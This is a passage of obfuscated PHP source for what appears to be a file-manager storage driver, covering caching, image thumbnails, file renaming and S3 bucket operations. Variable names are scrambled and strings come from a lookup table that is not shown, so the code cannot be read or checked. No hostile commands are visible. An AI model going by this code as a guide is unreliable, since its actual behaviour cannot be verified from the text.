$Ğ°…ıçƒ); } public function fileOutLink($”Ûäˆî”) { header($_SERVER[™¸œØ®Ü][175] . $”Ûäˆî”); die; } public function cacheMethod($ñ·ÜÆ”Ú, $ÈºŞ¾áÊ, $«üÄ©ãô = null) { $½¡ş÷Ú =& $_SERVER[™¸œØ®Ü]; static $ìŒÛœÔÆ = array(); $ü°÷ÓæÏ = $ÈºŞ¾áÊ ? ltrim($this->getPathOuter($ÈºŞ¾áÊ), $½¡ş÷Ú[8]) : $½¡ş÷Ú[12]; $‹‹æÆñ« = $½¡ş÷Ú[176] . $ñ·ÜÆ”Ú . $½¡ş÷Ú[177] . rtrim($ü°÷ÓæÏ, $½¡ş÷Ú[8]); if (is_null($ñ·ÜÆ”Ú)) { $ìŒÛœÔÆ = array(); return; } if (is_null($ÈºŞ¾áÊ)) { foreach ($ìŒÛœÔÆ as $‹‹æÆñ« => $Ïš…ÜÙ‘) { if (!strstr($‹‹æÆñ«, $½¡ş÷Ú[176] . $ñ·ÜÆ”Ú . $½¡ş÷Ú[178])) { continue; } unset($ìŒÛœÔÆ[$‹‹æÆñ«]); } return; } if (!is_null($«üÄ©ãô)) { $ìŒÛœÔÆ[$‹‹æÆñ«] = $«üÄ©ãô; return; } $˜Ï›é“µ = isset($ìŒÛœÔÆ[$‹‹æÆñ«]) ? $ìŒÛœÔÆ[$‹‹æÆñ«] : null; if (!is_null($˜Ï›é“µ)) { return $˜Ï›é“µ; } $˜Ï›é“µ = $this->{$ñ·ÜÆ”Ú}($ÈºŞ¾áÊ); $ìŒÛœÔÆ[$‹‹æÆñ«] = $˜Ï›é“µ; return $˜Ï›é“µ; } public function cacheMethodInfoSet($Ö°ê–ßŒ, $¨Œ¹ïç°, $î•ÑºŠ’ = false) { $Œ‡ò„—¾ =& $_SERVER[™¸œØ®Ü]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Œ‡ò„—¾[179], $Ö°ê–ßŒ, $¨Œ¹ïç°); $this->cacheMethod($Œ‡ò„—¾[180], $Ö°ê–ßŒ, $¨Œ¹ïç° ? !1 : !0); if (is_array($î•ÑºŠ’)) { $this->cacheMethod($Œ‡ò„—¾[181], $Ö°ê–ßŒ, $î•ÑºŠ’); } } public function fileOutImage($»¡ƒ, $ˆÙüÒ¼ = 250) { $‘¢üÙ =& $_SERVER[™¸œØ®Ü]; set_timeout(); if (substr($»¡ƒ, 0, 4) == $‘¢üÙ[152]) { $this->fileOutLink($»¡ƒ); } $ÚÙ‹Úª« = $this->info($»¡ƒ); $ôÆôşş¦ = !1; $”ÂÂÜõó = isset($GLOBALS[$‘¢üÙ[182]]) ? $GLOBALS[$‘¢üÙ[182]] : array(); if ($”ÂÂÜõó && $”ÂÂÜõó[$‘¢üÙ[183]] == $ÚÙ‹Úª«[$‘¢üÙ[87]]) { $ÚÙ‹Úª« = $”ÂÂÜõó; $öµÔËË = $ÚÙ‹Úª«[$‘¢üÙ[184]]; if ($öµÔËË && isset($öµÔËË[$‘¢üÙ[185]])) { if ($öµÔËË[$‘¢üÙ[185]] <= $ˆÙüÒ¼ && $öµÔËË[$‘¢üÙ[186]] <= $ˆÙüÒ¼) { $ôÆôşş¦ = !0; } } } if ($ÚÙ‹Úª«[$‘¢üÙ[79]] <= 1024 * 50 || $ôÆôşş¦ || !function_exists($‘¢üÙ[187]) || $ÚÙ‹Úª«[$‘¢üÙ[169]] == $‘¢üÙ[188]) { return $this->fileOut($»¡ƒ, !1, $ÚÙ‹Úª«[$‘¢üÙ[32]]); } $ı‚–˜§ß = kodIO::hashPath($ÚÙ‹Úª«); $êæ²¯ş = "\x63\157\166\145\162\x5f{$ı‚–˜§ß}\137{$ˆÙüÒ¼}\56\x70\x6e\147"; $…ÄÓÙÈ¡ = IO_PATH_SYSTEM_TEMP . $‘¢üÙ[189]; $Í‘ Ü¬Ä = IO::infoFullSimple($…ÄÓÙÈ¡); $Ğİ¿·¬ = $Í‘ Ü¬Ä && is_array($Í‘ Ü¬Ä) ? $Í‘ Ü¬Ä[$‘¢üÙ[87]] : $‘¢üÙ[12]; if (!$Ğİ¿·¬) { $Ğİ¿·¬ = IO::mkdir($…ÄÓÙÈ¡); } if ($ÚÙ‹Úª«[$‘¢üÙ[190]] == $‘¢üÙ[191] && isset($ÚÙ‹Úª«[$‘¢üÙ[192]]) && $ÚÙ‹Úª«[$‘¢üÙ[192]] == kodIO::sourceID($Ğİ¿·¬)) { $ÜŞŠ¨ìÚ = $ÚÙ‹Úª«[$‘¢üÙ[193]]; if ($ˆÙüÒ¼ <= 500) { $òê•Ö÷ = preg_replace($‘¢üÙ[194], $‘¢üÙ[195], $ÚÙ‹Úª«[$‘¢üÙ[32]]); $ÜŞŠ¨ìÚ = IO::fileNameExist($Ğİ¿·¬, $òê•Ö÷); } return IO::fileOut(KodIO::make($ÜŞŠ¨ìÚ), !1, $ÚÙ‹Úª«[$‘¢üÙ[32]]); } $ü†İØáğ = IO::fileNameExist($Ğİ¿·¬, $êæ²¯ş); if ($ü†İØáğ) { return IO::fileOut(KodIO::make($ü†İØáğ), !1, $ÚÙ‹Úª«[$‘¢üÙ[32]]); } if ($ˆÙüÒ¼ > 1000) { $this->makeImageCover($Ğİ¿·¬, $»¡ƒ, $êæ²¯ş, $ˆÙüÒ¼); $this->makeImageCover($Ğİ¿·¬, $»¡ƒ, "\143\x6f\166\x65\x72\x5f{$ı‚–˜§ß}\x5f\x32\x35\x30\x2e\160\156\x67", 250); $ü†İØáğ = IO::fileNameExist($Ğİ¿·¬, $êæ²¯ş); if ($ü†İØáğ) { return IO::fileOut(KodIO::make($ü†İØáğ), !1, $ÚÙ‹Úª«[$‘¢üÙ[32]]); } die; } if (!kodIO::allowCover($ÚÙ‹Úª«)) { return $this->fileOut($»¡ƒ, !1, $ÚÙ‹Úª«[$‘¢üÙ[32]]); } $¢›Ãóî = Cache::get($êæ²¯ş); if ($¢›Ãóî == $‘¢üÙ[196] || $¢›Ãóî == $‘¢üÙ[197]) { echo $¢›Ãóî; die; } Cache::set($êæ²¯ş, $‘¢üÙ[197], 60); $ÍÆ‘Õê¬ = array($Ğİ¿·¬, $ÚÙ‹Úª«[$‘¢üÙ[87]], $êæ²¯ş, $ˆÙüÒ¼); $À¯ÉËÑö = $‘¢üÙ[198] . $ÚÙ‹Úª«[$‘¢üÙ[79]] . $‘¢üÙ[199] . $êæ²¯ş . $‘¢üÙ[200] . $ÚÙ‹Úª«[$‘¢üÙ[32]] . $‘¢üÙ[201] . $ÚÙ‹Úª«[$‘¢üÙ[87]]; TaskQueue::add($‘¢üÙ[202], $ÍÆ‘Õê¬, $À¯ÉËÑö, $êæ²¯ş); } public function makeImageCover($•ìçÑüÚ, $Ü„àôË¬, $ÛÄª§·, $ß„®Ş€) { $ŸÌß»´à =& $_SERVER[™¸œØ®Ü]; if (IO::fileNameExist($•ìçÑüÚ, $ÛÄª§·)) { return $ŸÌß»´à[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $™‘¤“İ² = $this->getPathOuter($Ü„àôË¬); $ù££„ã¯ = DATA_THUMB . $ÛÄª§·; del_file($ù££„ã¯); $ß¾Æõïæ = IO::copy($™‘¤“İ², TEMP_FILES, !1, $ÛÄª§·); if (!@file_exists($ß¾Æõïæ)) { return $ŸÌß»´à[204]; } ImageThumb::createThumb($ß¾Æõïæ, $ù££„ã¯, $ß„®Ş€, $ß„®Ş€ * 10); if (@file_exists($ù££„ã¯)) { Cache::remove($ÛÄª§·); return IO::move($ù££„ã¯, $•ìçÑüÚ); } Cache::set($ÛÄª§·, $ŸÌß»´à[196], 600); del_file($ù££„ã¯); return $ŸÌß»´à[205] . $ß¾Æõïæ . $ŸÌß»´à[74]; } public function fileOutImageServer($ÚÛ‰ÂÈÄ, $Ç¬ªŸí” = 250) { $this->fileOutImage($ÚÛ‰ÂÈÄ, $Ç¬ªŸí”); } public function fileNameAuto($Ëßö’, $²Ù§İ…û, $†ÓÅòÒ = REPEAT_RENAME, $Ä™’ªø¬ = false) { $ºîéÃä =& $_SERVER[™¸œØ®Ü]; $Ë’Ñë®Î = $Ëßö’ === $ºîéÃä[12] ? $²Ù§İ…û : rtrim($Ëßö’, $ºîéÃä[8]) . $ºîéÃä[8] . $²Ù§İ…û; if ($†ÓÅòÒ == REPEAT_REPLACE || !$this->exist($Ë’Ñë®Î) || $Ä™’ªø¬ && $†ÓÅòÒ != REPEAT_RENAME_FOLDER) { return $²Ù§İ…û; } if ($†ÓÅòÒ == REPEAT_SKIP) { return !1; } $Æ——è¨é = $ºîéÃä[10] . get_path_ext($²Ù§İ…û); $Æ——è¨é = $Æ——è¨é == $ºîéÃä[10] || $Ä™’ªø¬ ? $ºîéÃä[12] : $Æ——è¨é; $Óå»¨°ğ = 1; $Ã…¿ïùü = substr($²Ù§İ…û, 0, strlen($²Ù§İ…û) - strlen($Æ——è¨é)); $û‘ÈåŒ = $Ã…¿ïùü . "\x28{$Óå»¨°ğ}\x29{$Æ——è¨é}"; while ($this->exist(rtrim($Ëßö’, $ºîéÃä[8]) . $ºîéÃä[8] . $û‘ÈåŒ)) { $û‘ÈåŒ = $Ã…¿ïùü . "\50{$Óå»¨°ğ}\x29{$Æ——è¨é}"; $Óå»¨°ğ++; } return $û‘ÈåŒ; } private function fileNameAutoList($ˆŞñ’Ôş, $õ•ßıï, $×¢ö¼Š = false) { $›·’çÇí =& $_SERVER[™¸œØ®Ü]; $äêıÍ¶” = $this->listPath($ˆŞñ’Ôş, !0); $äêıÍ¶” = array_merge($äêıÍ¶”[$›·’çÇí[85]], $äêıÍ¶”[$›·’çÇí[86]]); $™±õ¶« = array_to_keyvalue($äêıÍ¶”, $›·’çÇí[12], $›·’çÇí[32]); $ÊŠ§šöä = $›·’çÇí[10] . get_path_ext($õ•ßıï); $ÊŠ§šöä = $ÊŠ§šöä == $›·’çÇí[10] || $×¢ö¼Š ? $›·’çÇí[12] : $ÊŠ§šöä; $Š¨ÛİÛˆ = substr($õ•ßıï, 0, strlen($õ•ßıï) - strlen($ÊŠ§šöä)); $µ ›ˆ§è = $Š¨ÛİÛˆ . "\x28\60\51{$ÊŠ§šöä}"; for ($Ï¦ªºö = 1; $Ï¦ªºö <= count($™±õ¶«) + 1; $Ï¦ªºö++) { $µ ›ˆ§è = $Š¨ÛİÛˆ . "\50{$Ï¦ªºö}\x29{$ÊŠ§šöä}"; if (!in_array_not_case($µ ›ˆ§è, $™±õ¶«)) { return $µ ›ˆ§è; } } return $µ ›ˆ§è; } public function listAllFiles($´”“±Ôâ, $ÓÁÃ—Îß) { $¶°´Ê =& $_SERVER[™¸œØ®Ü]; if (empty($ÓÁÃ—Îß)) { return array(); } $Ÿ½êÅÑè = array_keys($ÓÁÃ—Îß); $£´¸ÜŞË = array(); $´”“±Ôâ = trim($´”“±Ôâ, $¶°´Ê[8]); foreach ($ÓÁÃ—Îß as $¦©°ÊË† => $ÀñÎ×¸) { $½âñ‰ù² = ltrim(substr(trim($¦©°ÊË†, $¶°´Ê[8]), strlen($´”“±Ôâ)), $¶°´Ê[8]); if (substr($¦©°ÊË†, -1) == $¶°´Ê[8]) { $½âñ‰ù² = rtrim($½âñ‰ù², $¶°´Ê[8]) . $¶°´Ê[8]; } $£´¸ÜŞË = array_merge($£´¸ÜŞË, $this->slicePath($½âñ‰ù²)); } $¦ÚæÁ§Ü = array(); foreach (array_unique($£´¸ÜŞË) as $ôØİ§§) { $ÛøÁ¤Â = array($¶°´Ê[87] => $this->getPathOuter($¶°´Ê[8] . $´”“±Ôâ . $¶°´Ê[8] . $ôØİ§§), $¶°´Ê[78] => 1, $¶°´Ê[79] => 0); if (substr($ôØİ§§, -1) != $¶°´Ê[8]) { $ÛøÁ¤Â[$¶°´Ê[78]] = 0; $ÇŒù†ë» = $this->getPath($´”“±Ôâ . $¶°´Ê[8] . $ôØİ§§); if (isset($ÓÁÃ—Îß[$ÇŒù†ë»])) { $½Ü¾¯‰ = $ÓÁÃ—Îß[$ÇŒù†ë»]; if (isset($½Ü¾¯‰[$¶°´Ê[79]])) { $ÛøÁ¤Â[$¶°´Ê[79]] = intval($½Ü¾¯‰[$¶°´Ê[79]]); } if (isset($½Ü¾¯‰[$¶°´Ê[206]])) { $ÛøÁ¤Â[$¶°´Ê[88]] = intval($½Ü¾¯‰[$¶°´Ê[206]]); } } } $¦ÚæÁ§Ü[] = $ÛøÁ¤Â; } return $¦ÚæÁ§Ü; } public function slicePath($Úå‘Ôüü) { $Œ¨‹Ğğí =& $_SERVER[™¸œØ®Ü]; $«Ìı‹¬³ = explode($Œ¨‹Ğğí[8], trim($Úå‘Ôüü, $Œ¨‹Ğğí[8])); $ÍüÑäÍ = 0; do { ++$ÍüÑäÍ; $€Šï™êç[] = implode($Œ¨‹Ğğí[8], array_slice($«Ìı‹¬³, 0, $ÍüÑäÍ)) . $Œ¨‹Ğğí[8]; } while ($ÍüÑäÍ < count($«Ìı‹¬³)); $€Šï™êç[count($«Ìı‹¬³) - 1] = $Úå‘Ôüü; return $€Šï™êç; } public function getHost() { $÷ş•Ú«« =& $_SERVER[™¸œØ®Ü]; $±ø’Ñ¡â = parse_url(trim($this->domain, $÷ş•Ú««[8])); $Î„ÃÑêÜ = isset($±ø’Ñ¡â[$÷ş•Ú««[207]]) ? $±ø’Ñ¡â[$÷ş•Ú««[207]] : http_type(); $„»ƒ¾ğ— = isset($±ø’Ñ¡â[$÷ş•Ú««[208]]) ? $±ø’Ñ¡â[$÷ş•Ú««[208]] : $±ø’Ñ¡â[$÷ş•Ú««[87]]; if (isset($±ø’Ñ¡â[$÷ş•Ú««[209]])) { $„»ƒ¾ğ— .= $÷ş•Ú««[4] . $±ø’Ñ¡â[$÷ş•Ú««[209]]; } return $Î„ÃÑêÜ . $÷ş•Ú««[210] . $„»ƒ¾ğ—; } public function pathEncode($«‘ÀÕèß) { $İÓÑÛı¼ =& $_SERVER[™¸œØ®Ü]; return str_replace($İÓÑÛı¼[211], $İÓÑÛı¼[8], rawurlencode($«‘ÀÕèß)); } public function writeLog($“ôú¢‘§ = '', $µçÚ­º½ = false) { $Ğ¢®šõ¸ =& $_SERVER[™¸œØ®Ü]; $–‰‘½§Ç = in_array(ACTION, array($Ğ¢®šõ¸[212], $Ğ¢®šõ¸[213])); if (!$–‰‘½§Ç && !GLOBAL_DEBUG) { return; } $»ùşŠŒ˜ = $“ôú¢‘§; static $ıëÆ ˆ» = null; if (!$ıëÆ ˆ») { $ıëÆ ˆ» = strtoupper($this->getType()); } $“ôú¢‘§ = $ıëÆ ˆ» . $Ğ¢®šõ¸[214] . $“ôú¢‘§; if ($µçÚ­º½) { $‚¬ñıŒÄ = error_get_last(); if ($‚¬ñıŒÄ) { $“ôú¢‘§ = array($“ôú¢‘§, $‚¬ñıŒÄ); } } write_log($“ôú¢‘§, $Ğ¢®šõ¸[215]); if ($–‰‘½§Ç) { throw new Exception($»ùşŠŒ˜); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ƒäææê) { set_timeout(); require_once SDK_DIR . $_SERVER[™¸œØ®Ü][216]; parent::__construct(); $this->_init($ƒäææê); } public function _init($òğÇ¸Ö¯) { $î´½™±Ä =& $_SERVER[™¸œØ®Ü]; $this->config = $òğÇ¸Ö¯; foreach ($òğÇ¸Ö¯ as $ù¼Ìúˆ¯ => $¬³ªºÅ†) { if (isset($this->{$ù¼Ìúˆ¯})) { $this->{$ù¼Ìúˆ¯} = $¬³ªºÅ†; } } $this->endpoint = $òğÇ¸Ö¯[$î´½™±Ä[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $»·Ğ€ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($»·Ğ€, 0, 7) == $î´½™±Ä[218]) { $»·Ğ€ = $î´½™±Ä[219] . substr($»·Ğ€, 7); } $this->client->setEndpoint($»·Ğ€); if (in_array(ACTION, array($î´½™±Ä[212], $î´½™±Ä[213]))) { $this->client->setExceptions(); } } public function setSignVersion($¤ ÷á¿İ = "\166\x34") { $this->signVer = $¤ ÷á¿İ; $this->client->setSignVersion($¤ ÷á¿İ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $¢æ±ñüõ) { return null; } } public function isBucketCors() { $Ó“ó¦›õ =& $_SERVER[™¸œØ®Ü]; $í‹üÑÑÓ = $this->getBucketCors(); if (!$í‹üÑÑÓ || !is_array($í‹üÑÑÓ)) { return !1; } if (!is_array($í‹üÑÑÓ[$Ó“ó¦›õ[220]])) { $í‹üÑÑÓ[$Ó“ó¦›õ[220]] = explode($Ó“ó¦›õ[50], $í‹üÑÑÓ[$Ó“ó¦›õ[220]]); } if ($í‹üÑÑÓ[$Ó“ó¦›õ[221]] != $Ó“ó¦›õ[222] || !in_array($Ó“ó¦›õ[222], $í‹üÑÑÓ[$Ó“ó¦›õ[220]])) { return !1; } $¹îç§Ì” = array_map($Ó“ó¦›õ[223], $í‹üÑÑÓ[$Ó“ó¦›õ[224]]); if (!is_array($¹îç§Ì”)) { $¹îç§Ì” = array(); } $™×»Š” = array($Ó“ó¦›õ[225], $Ó“ó¦›õ[226], $Ó“ó¦›õ[227], $Ó“ó¦›õ[228], $Ó“ó¦›õ[229]); $ŠÄúıÛÆ = array_diff($™×»Š”, $¹îç§Ì”); return empty($ŠÄúıÛÆ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Ş“ßáÖ, $€Ï’ÊÁŒ = '', $£ÛÊĞ´ß = REPEAT_RENAME) { $ûÂ‹½®ƒ = $this->setContent($Ş“ßáÖ, $€Ï’ÊÁŒ); if ($ûÂ‹½®ƒ !== !1) { return $this->getPathOuter($Ş“ßáÖ); } return !1; } public function mkdir($ƒ•ÚÙÅ, $‘½ïç« = REPEAT_SKIP) { $æ•ˆÌì… =& $_SERVER[™¸œØ®Ü]; if (empty($ƒ•ÚÙÅ) && $ƒ•ÚÙÅ !== $æ•ˆÌì…[230]) { return !1; } if ($‘½ïç« && $this->_isFolder($ƒ•ÚÙÅ)) { return $this->getPathOuter($ƒ•ÚÙÅ); } $È±üÊÖñ = $this->setContent($ƒ•ÚÙÅ, $æ•ˆÌì…[12], !0); if ($È±üÊÖñ !== !1) { return $this->getPathOuter($ƒ•ÚÙÅ); } return !1; } public function copyFile($Ù° ø˜¥, $²´Šàçµ, $´—‚ñ = array()) { $Ø¥¨ÕŒ‚ =& $_SERVER[™¸œØ®Ü]; $³´®Şº = $this->objectMeta($Ù° ø˜¥); if (!$³´®Şº) { return !1; } if ($³´®Şº[$Ø¥¨ÕŒ‚[79]] <= 1024 * 1024 * 200) { $©Öƒ™å” = $this->client->copyObject($this->bucket, $Ù° ø˜¥, $this->bucket, $²´Šàçµ, $Ø¥¨ÕŒ‚[231], $´—‚ñ); } else { $©Öƒ™å” = $this->client->multiCopyObject($this->bucket, $Ù° ø˜¥, $this->bucket, $²´Šàçµ, $´—‚ñ); } $©Öƒ™å” = $©Öƒ™å” ? $this->getPathOuter($²´Šàçµ) : !1; return $©Öƒ™å”; } public function moveFile($µ¤°‡Ø, $µÈøğ÷) { if ($this->copyFile($µ¤°‡Ø, $µÈøğ÷)) { $this->delFile($µ¤°‡Ø); return $this->getPathOuter($µÈøğ÷); } return !1; } public function delFile($Ë·Ùßã) { return $this->client->deleteObject($this->bucket, $Ë·Ùßã); } public function delFolder($ö­Ü’©—) { $îîÇŸİ =& $_SERVER[™¸œØ®Ü]; if (!$this->exist($ö­Ü’©—)) { return !0; } $this->listItemCache = !1; $óËˆ¼˜¸ = $this->fileList($ö­Ü’©—); $this->listItemCache = !0; $Ô¾ì¯»¤ = trim($ö­Ü’©—, $îîÇŸİ[8]) . $îîÇŸİ[8]; if (!empty($ö­Ü’©—) && $ö­Ü’©— !== $îîÇŸİ[230] && !in_array($Ô¾ì¯»¤, $óËˆ¼˜¸[$îîÇŸİ[85]])) { $óËˆ¼˜¸[$îîÇŸİ[85]][] = $Ô¾ì¯»¤; } $Á¬ˆÜÎ¦ = $this->delByBatch($óËˆ¼˜¸[$îîÇŸİ[86]]); if (!$Á¬ˆÜÎ¦) { return !1; } $Á¬ˆÜÎ¦ = $this->delByBatch($óËˆ¼˜¸[$îîÇŸİ[85]]); if (!$Á¬ˆÜÎ¦) { return !1; } return $this->delFile($Ô¾ì¯»¤); } private function delByBatch($“ÛÚƒ÷) { foreach (array_chunk($“ÛÚƒ÷, 1000) as $£ªÍı–) { $‘îì×â£ = $this->client->deleteObjects($this->bucket, $£ªÍı–); if (!$‘îì×â£) { return !1; } } return !0; } public function rename($£©±€œÕ, $Ñ–¡‡—) { return $this->renameObject($£©±€œÕ, $Ñ–¡‡—); } public function listPath($ßÌéÒóş, $ß–óéŒÔ = false) { $È¥‡ú¢Š =& $_SERVER[™¸œØ®Ü]; $õì©êıù = $this->fileList($ßÌéÒóş, $È¥‡ú¢Š[8], !0); foreach ($õì©êıù[$È¥‡ú¢Š[85]] as $©ªŞÓ’Ø => $Ş¡ë¼ë¯) { $õì©êıù[$È¥‡ú¢Š[85]][$©ªŞÓ’Ø] = $this->folderInfo($Ş¡ë¼ë¯, $ß–óéŒÔ, $Ş¡ë¼ë¯); } foreach ($õì©êıù[$È¥‡ú¢Š[86]] as $©ªŞÓ’Ø => $Ş¡ë¼ë¯) { $õì©êıù[$È¥‡ú¢Š[86]][$©ªŞÓ’Ø] = $this->fileInfo($Ş¡ë¼ë¯[$È¥‡ú¢Š[32]], $ß–óéŒÔ, $Ş¡ë¼ë¯); } return $õì©êıù; } protected function infoChildren($şä¤˜Â, &$ÜØğæ) { $é×ÕØŞ… =& $_SERVER[™¸œØ®Ü]; $»§¸©ï€ = $this->fileList($şä¤˜Â, $é×ÕØŞ…[12], !0); $ÜØğæ[$é×ÕØŞ…[81]] += count($»§¸©ï€[$é×ÕØŞ…[85]]); $ÜØğæ[$é×ÕØŞ…[80]] += count($»§¸©ï€[$é×ÕØŞ…[86]]); foreach ($»§¸©ï€[$é×ÕØŞ…[86]] as $¥ÛÄ™¦‰) { if (!$¥ÛÄ™¦‰ || !$¥ÛÄ™¦‰[$é×ÕØŞ…[79]]) { continue; } $ÜØğæ[$é×ÕØŞ…[79]] += $¥ÛÄ™¦‰[$é×ÕØŞ…[79]]; } } private function fileInfo($Ğ¼´º©ƒ, $ÉØÖ²øå = false, $ªÊûşöÉ = array()) { $‡ôş¸õ¡ =& $_SERVER[™¸œØ®Ü]; $¸¡ò”ëÍ = array($‡ôş¸õ¡[32] => $this->pathThis($Ğ¼´º©ƒ), $‡ôş¸õ¡[87] => $this->getPathOuter($Ğ¼´º©ƒ), $‡ôş¸õ¡[33] => $‡ôş¸õ¡[232], $‡ôş¸õ¡[169] => $this->ext($Ğ¼´º©ƒ), $‡ôş¸õ¡[79] => isset($ªÊûşöÉ[$‡ôş¸õ¡[79]]) ? $ªÊûşöÉ[$‡ôş¸õ¡[79]] : 0); if ($ÉØÖ²øå) { return $¸¡ò”ëÍ; } $¸¡ò”ëÍ[$‡ôş¸õ¡[233]] = $¸¡ò”ëÍ[$‡ôş¸õ¡[88]] = 0; $¸¡ò”ëÍ[$‡ôş¸õ¡[234]] = $¸¡ò”ëÍ[$‡ôş¸õ¡[235]] = !0; if (empty($ªÊûşöÉ)) { $ªÊûşöÉ = $this->objectMeta($Ğ¼´º©ƒ); if (!$ªÊûşöÉ) { return $¸¡ò”ëÍ; } } if (isset($ªÊûşöÉ[$‡ôş¸õ¡[236]]) && $ªÊûşöÉ[$‡ôş¸õ¡[236]]) { $¸¡ò”ëÍ[$‡ôş¸õ¡[237]] = $ªÊûşöÉ[$‡ôş¸õ¡[236]]; } if (isset($ªÊûşöÉ[$‡ôş¸õ¡[206]])) { $¸¡ò”ëÍ[$‡ôş¸õ¡[88]] = $ªÊûşöÉ[$‡ôş¸õ¡[206]]; } if (isset($ªÊûşöÉ[$‡ôş¸õ¡[79]])) { $¸¡ò”ëÍ[$‡ôş¸õ¡[79]] = $ªÊûşöÉ[$‡ôş¸õ¡[79]]; } return $¸¡ò”ëÍ; } private function folderInfo($©‰à®ˆµ, $úªÄËØ‚ = false, $ŠÎşüÇÄ = array()) { $éÁ…Ïşç =& $_SERVER[™¸œØ®Ü]; $¸Óİ£ş = array($éÁ…Ïşç[32] => $this->pathThis($©‰à®ˆµ), $éÁ…Ïşç[87] => $this->getPathOuter($éÁ…Ïşç[8] . $©‰à®ˆµ), $éÁ…Ïşç[33] => $éÁ…Ïşç[78]); if ($úªÄËØ‚) { return $¸Óİ£ş; } $¸Óİ£ş[$éÁ…Ïşç[233]] = $¸Óİ£ş[$éÁ…Ïşç[88]] = 0; $¸Óİ£ş[$éÁ…Ïşç[234]] = $¸Óİ£ş[$éÁ…Ïşç[235]] = !0; if ($©‰à®ˆµ == $éÁ…Ïşç[12]) { return $¸Óİ£ş; } if (empty($ŠÎşüÇÄ)) { $ŠÎşüÇÄ = $this->objectMeta(trim($©‰à®ˆµ, $éÁ…Ïşç[8]) . $éÁ…Ïşç[8]); } if (isset($ŠÎşüÇÄ[$éÁ…Ïşç[206]])) { $¸Óİ£ş[$éÁ…Ïşç[233]] = $ŠÎşüÇÄ[$éÁ…Ïşç[206]]; } return $¸Óİ£ş; } private function fileList($ãÊö³ı, $†øÀ²­… = '', $Í‡ÇŸ˜½ = 0) { $æã¢Ê®  =& $_SERVER[™¸œØ®Ü]; $‹Ããèß§ = rtrim($ãÊö³ı, $æã¢Ê® [8]) . $æã¢Ê® [8]; $À¶Â§Ô = $this->listObjs($‹Ããèß§, null, null, $†øÀ²­…); if (!$À¶Â§Ô) { return array($æã¢Ê® [85] => array(), $æã¢Ê® [86] => array()); } $ëü«ªšÃ = $„Á°¯õş = array(); foreach ($À¶Â§Ô[$æã¢Ê® [238]] as $º‡Ï‡ôå) { $ô™¬İ½î = $º‡Ï‡ôå[$æã¢Ê® [32]]; if ($ô™¬İ½î == $‹Ããèß§) { continue; } $ı‹¤Ä = isset($º‡Ï‡ôå[$æã¢Ê® [79]]) ? $º‡Ï‡ôå[$æã¢Ê® [79]] : 0; $ÇúÎì«É = $ı‹¤Ä == 0 && substr($ô™¬İ½î, strlen($ô™¬İ½î) - 1, 1) == $æã¢Ê® [8] ? !0 : !1; $this->cacheMethodInfoSet($ô™¬İ½î, $ÇúÎì«É, $º‡Ï‡ôå); if ($ÇúÎì«É) { $ëü«ªšÃ[] = $ô™¬İ½î; continue; } $„Á°¯õş[] = $Í‡ÇŸ˜½ ? $º‡Ï‡ôå : $ô™¬İ½î; } foreach ($À¶Â§Ô[$æã¢Ê® [239]] as $º‡Ï‡ôå) { $ëü«ªšÃ[] = $º‡Ï‡ôå[$æã¢Ê® [32]]; $this->cacheMethodInfoSet($º‡Ï‡ôå[$æã¢Ê® [32]], !0); } $this->cacheMethodInfoSet($ãÊö³ı, !0); return array($æã¢Ê® [85] => $ëü«ªšÃ, $æã¢Ê® [86] => $„Á°¯õş); } private function listObjs($×öÁİÎº, $ğš±éÜÍ = null, $´Á¦«„ = null, $Â§……ĞÈ = null) { $óïà“Íì =& $_SERVER[™¸œØ®Ü]; $×öÁİÎº = trim($×öÁİÎº, $óïà“Íì[8]); $òæÃÚ½ = empty($×öÁİÎº) && $×öÁİÎº !== $óïà“Íì[230] ? $óïà“Íì[12] : $×öÁİÎº . $óïà“Íì[8]; return $this->client->getBucket($this->bucket, $òæÃÚ½, $ğš±éÜÍ, $´Á¦«„, $Â§……ĞÈ, !0); } public function has($ØÔâˆå¬, $¬ŸËäºÒ = false, $îÆæµ¹Ş = true) { $½¿ÛÅ® =& $_SERVER[™¸œØ®Ü]; $ØÔâˆå¬ = trim($ØÔâˆå¬, $½¿ÛÅ®[8]); $Ò®±æ¶¼ = empty($ØÔâˆå¬) && $ØÔâˆå¬ !== $½¿ÛÅ®[230] ? $½¿ÛÅ®[12] : $ØÔâˆå¬ . $½¿ÛÅ®[8]; $×ÂğÕ·å = null; $â¨Öüò¬ = 500; $éŠå†  = $½¿ÛÅ®[8]; $³èİİ™Ÿ = $éîİ¢° = array(); while (!0) { $ÀœÄƒ²ƒ = $this->listObjs($ØÔâˆå¬, $×ÂğÕ·å, $â¨Öüò¬, $éŠå† ); if (!$ÀœÄƒ²ƒ) { break; } $×ÂğÕ·å = $ÀœÄƒ²ƒ[$½¿ÛÅ®[240]]; $³Ñœû£° = $ÀœÄƒ²ƒ[$½¿ÛÅ®[238]]; $ µÑ†×— = $ÀœÄƒ²ƒ[$½¿ÛÅ®[239]]; if (empty($³Ñœû£°) && empty($ µÑ†×—)) { break; } if (count($³Ñœû£°) == 1 && $³Ñœû£°[0][$½¿ÛÅ®[32]] == $Ò®±æ¶¼) { break; } if ($¬ŸËäºÒ) { if (count($³Ñœû£°)) { $³Ñœû£° = array_column($³Ñœû£°, $½¿ÛÅ®[32]); $³èİİ™Ÿ = array_merge($³èİİ™Ÿ, $³Ñœû£°); } if (count($ µÑ†×—)) { $ µÑ†×— = array_column($ µÑ†×—, $½¿ÛÅ®[32]); $éîİ¢° = array_merge($éîİ¢°, $ µÑ†×—); } if ($×ÂğÕ·å === null) { break; } continue; } if ($îÆæµ¹Ş) { if (!empty($³Ñœû£°)) { if (count($³Ñœû£°) > 1 || isset($³Ñœû£°[0][$½¿ÛÅ®[32]]) && 